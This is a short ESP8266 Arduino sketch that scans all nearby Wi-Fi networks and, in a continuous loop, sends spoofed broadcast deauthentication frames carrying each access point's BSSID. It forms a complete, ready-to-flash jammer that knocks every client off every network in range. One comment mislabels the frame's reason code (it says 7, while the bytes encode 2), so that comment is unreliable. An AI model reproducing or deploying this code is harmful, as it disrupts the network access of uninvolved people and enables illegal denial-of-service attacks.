#include "ESP8266WiFi.h"

uint8_t packet[26] = {
  0xc0, 0x00,   // Frame Control: deauth
  0x00, 0x00,   // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Placeholder for Source (AP)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Placeholder for BSSID (AP)
  0x00, 0x00,   // Sequence number
  0x02, 0x00    // Reason code: 7 (Class 3 frame received from nonassociated STA)
};

long previousMillis = -30000; // a dirty hack,i know
#define interval 30000
int numNetworks;

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
}

void loop() {
  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= interval) {
    previousMillis = currentMillis;
    numNetworks = WiFi.scanNetworks(false, true);
    for (int i = 0; i < numNetworks; ++i) {
      Serial.println("--------------------------------");// this thing is ai generated,too lazy to modify
      Serial.print("Network Name (SSID): ");
      Serial.println(WiFi.SSID(i));
      Serial.print("Signal Strength (RSSI): ");
      Serial.println(WiFi.RSSI(i));
      Serial.print("MAC Address (BSSID): ");
      Serial.println(WiFi.BSSIDstr(i));
      Serial.print("Channel: ");
      Serial.println(WiFi.channel(i));
      Serial.println("--------------------------------");// balls
    }
  }
  
  for (int i = 0; i < numNetworks; ++i) {
    uint8_t* bssid = WiFi.BSSID(i);
    wifi_set_channel(WiFi.channel(i));
    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);
    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
    delay(1);
  }
}
